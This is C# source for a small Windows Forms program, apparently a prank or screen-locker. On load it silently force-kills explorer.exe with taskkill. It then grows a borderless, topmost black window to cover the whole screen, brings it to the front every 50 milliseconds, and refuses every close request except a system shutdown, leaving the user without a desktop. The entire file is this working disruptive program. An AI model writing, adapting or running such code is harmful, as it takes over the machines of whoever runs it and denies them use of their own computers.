using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Threading;
using System.Diagnostics;

namespace Eat
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Size = new Size(1, 1);
            Location = new Point(0, 0);
            ShowInTaskbar = false;
            TopMost = true;
            BackColor = Color.FromArgb(0, 0, 0);
            new Thread(() => Eat()).Start();
            new Thread(() => Foreground_And_Stuff()).Start();
        }

        private void Eat()
        {
            try
            {
                ProcessStartInfo a = new ProcessStartInfo()
                {
                    FileName = "taskkill",
                    Arguments = "/f /im explorer.exe",
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(a);

                this.Invoke(new Action(() => this.BringToFront()));
            }
            catch { }
            try
            {
                while (Width < Screen.PrimaryScreen.Bounds.Width)
                {
                    this.Invoke(new Action(() => Width = Width + 1));
                    if (Height < Screen.PrimaryScreen.Bounds.Height)
                    {
                        this.Invoke(new Action(() => Height = Height + 1));
                    }
                    Thread.Sleep(1);
                }
            }
            catch { }
        }

        private void Foreground_And_Stuff()
        {
            while (true)
            {
                try
                {
                    this.Invoke(new Action(() => this.BringToFront()));
                }
                catch { }

                Thread.Sleep(50);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason != CloseReason.WindowsShutDown)
            {
                e.Cancel = true;
            }
        }
    }
}
